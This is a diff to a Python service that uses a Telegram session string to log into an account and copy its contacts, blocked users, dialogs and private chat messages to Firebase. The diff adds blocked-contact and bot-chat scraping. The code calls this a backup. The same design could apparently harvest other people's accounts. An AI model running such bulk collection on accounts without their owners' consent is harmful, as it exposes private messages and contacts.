@@ -8,7 +8,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError, FloodWaitError
-from telethon.tl.functions.contacts import GetContactsRequest
+from telethon.tl.functions.contacts import GetContactsRequest, GetBlockedRequest
 from telethon.tl.functions.messages import ExportChatInviteRequest
 from telethon.tl.types import User, Chat, Channel
 
@@ -97,7 +97,7 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
     base_path = f"backup/{my_username}"
 
-        # 1. Contacts
+    # 1. Contacts
     contacts = await client(GetContactsRequest(hash=0))
     contact_ids = {str(u.id) for u in contacts.users}
     
@@ -114,12 +114,27 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
         put_to_firebase(f"{base_path}/contacts", contacts_data)
         print(f"✅ Saved {len(contacts_data)} saved contacts.")
 
+    # 1.5 Blocked Contacts (NEW)
+    try:
+        blocked_result = await client(GetBlockedRequest(offset=0, limit=100))
+        blocked_data = {}
+        for user in blocked_result.users:
+            blocked_data[str(user.id)] = {
+                "first_name": user.first_name or "",
+                "last_name": user.last_name or "",
+                "username": user.username or "None"
+            }
+        if blocked_data:
+            put_to_firebase(f"{base_path}/blocked_contacts", blocked_data)
+            print(f"✅ Saved {len(blocked_data)} blocked contacts.")
+    except Exception as e:
+        print(f"⚠️ Error fetching blocked contacts: {e}")
+
     p2p_users = []
     unsaved = {}
-    dialogs_data = {"channels": {}, "groups": {}}
+    dialogs_data = {"channels": {}, "groups": {}, "bots": {}} # Added 'bots' dict
 
-
-    # 2. Iterate Dialogs (Mapping P2P, Groups, and Channels)
+    # 2. Iterate Dialogs (Mapping P2P, Groups, Channels, and Bots)
     async for dialog in client.iter_dialogs():
         entity = dialog.entity
         entity_id = str(dialog.id)
@@ -129,6 +144,19 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
             p2p_users.append(entity)
             if entity_id not in contact_ids:
                 unsaved[entity_id] = {"n": dialog.name, "u": entity.username}
+
+        # Handle Bots (NEW)
+        elif isinstance(entity, User) and getattr(entity, 'bot', False):
+            # Append bot to p2p_users so its messages get scraped by the same concurrency engine
+            p2p_users.append(entity)
+            
+            # Store bot metadata and invite link
+            invite_link = f"https://t.me/{entity.username}" if entity.username else "No public link"
+            dialogs_data["bots"][entity_id] = {
+                "name": dialog.name,
+                "invite_url": invite_link,
+                "entity_id": entity.id
+            }
 
         # Handle Groups and Channels
         elif isinstance(entity, (Chat, Channel)):
@@ -154,10 +182,10 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     # Save Unsaved Contacts and Dialog Metadata
     if unsaved: 
         patch_to_firebase(f"{base_path}/unsaved", unsaved)
-    if dialogs_data["channels"] or dialogs_data["groups"]:
+    if dialogs_data["channels"] or dialogs_data["groups"] or dialogs_data.get("bots"):
         patch_to_firebase(f"{base_path}/dialogs", dialogs_data)
 
-    # 3. Concurrency Engine for P2P Chats (Resumes where left off)
+    # 3. Concurrency Engine for P2P Chats & Bots (Resumes where left off)
     print(f"⚡ Scraping {len(p2p_users)} chats using {CONCURRENT_CHATS} parallel workers...")
     for i in range(0, len(p2p_users), CONCURRENT_CHATS):
         batch = p2p_users[i:i + CONCURRENT_CHATS]
